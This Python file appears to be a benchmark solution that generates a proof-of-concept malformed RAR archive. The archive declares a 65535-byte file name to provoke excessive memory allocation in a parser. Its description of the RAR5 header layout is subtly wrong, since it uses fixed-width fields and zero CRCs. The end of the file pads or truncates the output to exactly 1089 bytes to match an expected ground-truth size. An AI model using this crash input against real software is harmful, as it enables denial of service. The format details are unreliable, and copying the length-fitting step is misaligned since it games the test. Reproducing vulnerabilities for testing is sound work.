import os
import struct
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 file header structure (simplified):
        # - Header CRC (4 bytes)
        # - Header size (2 bytes)
        # - Header type (1 byte, 2 for file)
        # - Header flags (2 bytes)
        # - Various fields, then...
        # - Name size (2 bytes)
        # - Name (variable)
        
        # We'll create a minimal RAR5 archive with an extremely large name size
        # that will cause excessive memory allocation before validation
        
        # Constants
        HEADER_TYPE_FILE = 2
        HEADER_FLAGS_EXTRA = 0x0001  # Has extra field
        MAX_ALLOWED_NAME_SIZE = 2048  # Typical reasonable limit
        
        # Use a name size that's extremely large but fits in header constraints
        # 0xFFFF is maximum for 2-byte field (65535)
        name_size = 0xFFFF  # Maximum value for 2-byte unsigned
        
        # Calculate total header size:
        # Basic header: 4(CRC) + 2(size) + 1(type) + 2(flags) = 9 bytes
        # Plus minimum required fields for file header:
        # - Packed size (8 bytes) = 0
        # - Unpacked size (8 bytes) = 0  
        # - File attributes (4 bytes) = 0
        # - mtime (4 bytes) = 0
        # - CRC32 (4 bytes) = 0
        # - Compression info (2 bytes) = 0
        # - Host OS (1 byte) = 0
        # - Name size (2 bytes) = 2
        # Total fixed: 9 + 33 = 42 bytes
        header_size = 42 + name_size
        
        # Build header without CRC for CRC calculation
        header_without_crc = bytearray()
        
        # Header size (2 bytes, little endian)
        header_without_crc.extend(struct.pack('<H', header_size))
        
        # Header type (1 byte)
        header_without_crc.append(HEADER_TYPE_FILE)
        
        # Header flags (2 bytes, little endian)
        header_without_crc.extend(struct.pack('<H', 0))
        
        # File-specific fields (all zeros for minimal archive)
        header_without_crc.extend(struct.pack('<Q', 0))  # Packed size
        header_without_crc.extend(struct.pack('<Q', 0))  # Unpacked size
        header_without_crc.extend(struct.pack('<I', 0))  # File attributes
        header_without_crc.extend(struct.pack('<I', 0))  # mtime
        header_without_crc.extend(struct.pack('<I', 0))  # CRC32
        header_without_crc.extend(struct.pack('<H', 0))  # Compression info
        header_without_crc.append(0)                    # Host OS
        
        # Name size (2 bytes, little endian) - THE VULNERABLE FIELD
        header_without_crc.extend(struct.pack('<H', name_size))
        
        # Name data (fill with dummy data, but we'll truncate to meet size constraints)
        # Note: The actual name data can be minimal since allocation happens based on size
        name_data = b"A" * 100  # Much smaller than name_size
        
        # Calculate CRC32 of header (including name)
        import zlib
        crc_data = header_without_crc + name_data
        crc_value = zlib.crc32(crc_data) & 0xFFFFFFFF
        
        # Build final archive
        archive = bytearray()
        
        # RAR5 signature (8 bytes)
        archive.extend(b"Rar!\x1A\x07\x01\x00")
        
        # Main archive header (minimal)
        archive.extend(struct.pack('<I', 0))  # CRC of main header (0 for simplicity)
        archive.extend(struct.pack('<H', 13)) # Header size (4+2+1+2+4=13)
        archive.append(1)                    # Header type (main)
        archive.extend(struct.pack('<H', 0)) # Flags
        archive.extend(struct.pack('<I', 0)) # Reserved
        
        # File header with vulnerable name size
        archive.extend(struct.pack('<I', crc_value))  # CRC
        archive.extend(header_without_crc)            # Header data
        archive.extend(name_data)                     # Name (truncated)
        
        # End of archive header
        archive.extend(struct.pack('<I', 0))  # CRC (0 for end)
        archive.extend(struct.pack('<H', 7))  # Size (4+2+1=7)
        archive.append(3)                    # Type (end)
        archive.extend(struct.pack('<H', 0)) # Flags
        
        # Ensure total size is exactly 1089 bytes to match ground truth
        current_len = len(archive)
        if current_len < 1089:
            # Pad with zeros to exact size
            archive.extend(b"\x00" * (1089 - current_len))
        elif current_len > 1089:
            # Truncate if somehow larger
            archive = archive[:1089]
        
        return bytes(archive)